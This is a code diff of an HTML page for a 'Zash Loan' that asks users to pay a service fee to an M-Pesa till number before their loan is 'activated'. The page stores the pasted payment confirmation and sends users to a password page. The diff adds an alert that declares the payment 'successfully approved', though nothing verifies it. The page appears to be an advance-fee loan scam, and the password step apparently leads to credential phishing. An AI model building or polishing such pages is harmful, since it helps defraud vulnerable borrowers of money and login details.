@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verify Payment | Zash Loan</title>
+  <title>Zash Loan Payment Verification</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gradient-to-br from-[#FF4E50] via-[#FF6A5C] to-[#FF7C65] min-h-screen text-[#b60000] flex items-center justify-center p-4">
@@ -11,38 +11,37 @@
   <div class="bg-white/90 backdrop-blur-md w-full max-w-md p-6 rounded-2xl shadow-2xl text-center">
     <img src="/mnt/data/e9c0da33-f4b7-46a9-b2bc-8ef8c4ec4d90.jpg" alt="Zash Logo" class="w-16 h-16 mx-auto mb-4 rounded-full shadow" />
 
-    <h1 class="text-xl font-bold text-[#FF4E50] mb-2">Confirm Your Loan Payment</h1>
-    <p class="text-sm text-gray-700 mb-4">To proceed, pay the service fee via M-Pesa and paste the confirmation message below.</p>
+    <h1 class="text-xl font-bold text-[#FF4E50] mb-2">Loan Payment Verification</h1>
+    <p class="text-sm text-gray-700 mb-4">To activate your loan, please pay the service fee to the Till Number below.</p>
 
     <!-- Loan Summary -->
-    <div class="text-left bg-[#FFF5F5] p-4 rounded-xl border border-[#FFD4D4] text-sm space-y-2 mb-4">
+    <div class="text-left bg-[#FFF5F5] p-4 rounded-xl border border-[#FFD4D4] text-sm space-y-2 mb-6">
       <p><strong>Name:</strong> <span id="verifyName">...</span></p>
       <p><strong>Loan Amount:</strong> Ksh <span id="verifyLoan">...</span></p>
       <p><strong>Service Fee (6.4%):</strong> <span id="verifyFee">...</span></p>
-      <p class="flex items-center gap-2">
-        <strong>Pay Till Number:</strong>
-        <span id="tillNumber" class="font-bold text-[#FF4E50]">9824375</span>
-        <button onclick="copyTill()" class="text-xs bg-[#FF4E50] text-white px-2 py-1 rounded hover:bg-[#e93e3f]">Copy</button>
+      <p><strong>Pay Till Number:</strong> 
+        <span class="font-bold text-[#FF4E50]" id="tillNumber">9824375</span>
+        <button onclick="copyTill()" class="ml-2 px-2 py-1 text-xs bg-[#FF4E50] text-white rounded">Copy</button>
       </p>
+      <p class="text-xs text-gray-600">Use your M-Pesa to send the exact service fee via Buy Goods and Services.</p>
     </div>
 
-    <!-- Payment Instructions -->
-    <div class="text-left bg-white border border-red-200 p-4 rounded-xl mb-6">
-      <h2 class="text-sm font-bold text-[#FF4E50] mb-2">💳 How to Pay via M-Pesa</h2>
-      <ol class="text-sm list-decimal list-inside space-y-1 text-gray-700">
-        <li>Go to M-Pesa menu</li>
+    <!-- Guide Section -->
+    <div class="text-left text-sm mb-4 bg-yellow-50 border-l-4 border-yellow-400 p-3 rounded">
+      <p class="font-medium">📋 How to Pay:</p>
+      <ol class="list-decimal pl-5 mt-1 space-y-1">
+        <li>Go to M-Pesa > Lipa na M-Pesa</li>
         <li>Select <strong>Buy Goods and Services</strong></li>
         <li>Enter Till Number: <strong>9824375</strong></li>
-        <li>Enter Amount: <strong><span id="guideFee">...</span></strong></li>
-        <li>Enter your PIN and press OK</li>
-        <li>Wait for M-Pesa confirmation SMS</li>
+        <li>Enter Amount: <strong id="guideFee">...</strong></li>
+        <li>Enter M-Pesa PIN and Send</li>
       </ol>
     </div>
 
-    <!-- Mpesa Confirmation -->
+    <!-- Mpesa Code Input -->
     <div class="mb-4 text-left">
       <label for="mpesaText" class="block text-sm font-medium mb-1">Paste M-Pesa Confirmation Message</label>
-      <textarea id="mpesaText" rows="3" placeholder="e.g., QHG4RT8Y Confirmed. Ksh240 sent to HAKIKA R PROVISION"
+      <textarea id="mpesaText" rows="3" placeholder="e.g. QHG4RT8Y Confirmed. Ksh120 sent to HAKIKA R PROVISION..."
         class="w-full p-3 rounded-xl border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#FF4E50] text-sm"></textarea>
     </div>
 
@@ -82,6 +81,7 @@
       }
 
       localStorage.setItem("mpesaMessage", message);
+      alert("✅ Your payment has been successfully approved!");
       window.location.href = "password.html";
     }
   </script>
